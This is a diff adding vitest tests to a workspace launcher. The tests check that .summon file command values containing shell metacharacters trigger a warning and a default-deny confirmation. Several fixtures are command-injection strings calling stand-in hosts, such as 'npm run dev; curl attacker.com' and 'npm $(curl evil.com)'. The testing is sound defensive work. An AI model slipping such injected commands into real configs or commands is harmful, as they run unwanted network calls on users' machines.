@@ -1,4 +1,4 @@
-import { describe, it, expect, vi, beforeEach } from "vitest";
+import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 
 // Mock child_process before importing launcher
 const mockExecSync = vi.fn();
@@ -1165,5 +1165,367 @@ describe("path resolution", () => {
       "/tmp/workspace",
       expect.any(String),
     );
+  });
+});
+
+describe("shell metacharacter confirmation (#90)", () => {
+  let origIsTTY: boolean | undefined;
+
+  beforeEach(() => {
+    origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+  });
+
+  afterEach(() => {
+    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+  });
+
+  it("does not prompt when .summon values are safe", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["editor", "vim"], ["sidebar", "lazygit"], ["server", "npm run dev"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    await launch("/tmp/workspace");
+
+    // Verify the launch completed normally
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
+  });
+
+  it("prompts when .summon file contains semicolons in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; curl attacker.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    // User confirms
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains pipe in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["editor", "vim | tee log"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains ampersand in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev & evil"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains backticks in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run `evil`"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains $( in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm $(curl evil.com)"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains redirect operators in command values", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev > /tmp/log"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("exits with code 1 when user declines the confirmation", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; curl attacker.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    // User declines
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("n");
+    });
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
+
+    mockExit.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("exits with code 1 when user presses Enter (default is deny)", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; curl attacker.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    // User presses Enter (empty string)
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("");
+    });
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
+
+    mockExit.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("proceeds when user confirms with 'y'", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; echo done"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    // Should have completed normally
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
+    warnSpy.mockRestore();
+  });
+
+  it("proceeds when user confirms with 'yes'", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; echo done"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("yes");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
+    warnSpy.mockRestore();
+  });
+
+  it("exits with code 1 on non-TTY stdin with dangerous commands", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; curl attacker.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    // Simulate non-TTY
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
+
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    try {
+      await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+      expect(mockExit).toHaveBeenCalledWith(1);
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      mockExit.mockRestore();
+      warnSpy.mockRestore();
+    }
+  });
+
+  it("skips metacharacter check when --dry-run is set", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["server", "npm run dev; curl attacker.com"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { dryRun: true });
+
+    // Should not have warned about metacharacters
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+    logSpy.mockRestore();
+    warnSpy.mockRestore();
+  });
+
+  it("does not prompt for metacharacters from CLI flags", async () => {
+    // CLI flags are trusted — only .summon file values trigger the check
+    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace", { server: "npm run dev; echo done" });
+
+    // No metacharacter warning should appear
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+    warnSpy.mockRestore();
+  });
+
+  it("does not prompt for metacharacters from machine config", async () => {
+    mockReadKVFile.mockReturnValue(new Map()); // empty .summon file
+    vi.mocked(listConfig).mockReturnValue(
+      new Map([["server", "npm run dev; echo done"]]),
+    );
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+    warnSpy.mockRestore();
+  });
+
+  it("lists all dangerous commands in the warning message", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([
+        ["editor", "vim | tee"],
+        ["server", "npm run dev; curl evil.com"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    const metaWarning = warnMessages.find((m) => m.includes("shell metacharacters"));
+    expect(metaWarning).toBeDefined();
+    expect(metaWarning).toContain("editor");
+    expect(metaWarning).toContain("vim | tee");
+    expect(metaWarning).toContain("server");
+    expect(metaWarning).toContain("npm run dev; curl evil.com");
+
+    warnSpy.mockRestore();
+  });
+
+  it("does not check non-command keys from .summon for metacharacters", async () => {
+    // Keys like layout, panes, editor-size are not command values
+    mockReadKVFile.mockReturnValue(
+      new Map([["layout", "minimal"], ["panes", "3"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    const warnMessages = warnSpy.mock.calls.map((c) => c[0] as string);
+    expect(warnMessages.every((m) => !m.includes("shell metacharacters"))).toBe(true);
+
+    warnSpy.mockRestore();
+  });
+
+  it("resolveConfig returns projectOverrides from .summon file", () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["editor", "vim"], ["server", "npm run dev"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    const result = resolveConfig("/tmp/workspace", {});
+    expect(result.projectOverrides).toBeInstanceOf(Map);
+    expect(result.projectOverrides.get("editor")).toBe("vim");
+    expect(result.projectOverrides.get("server")).toBe("npm run dev");
   });
 });
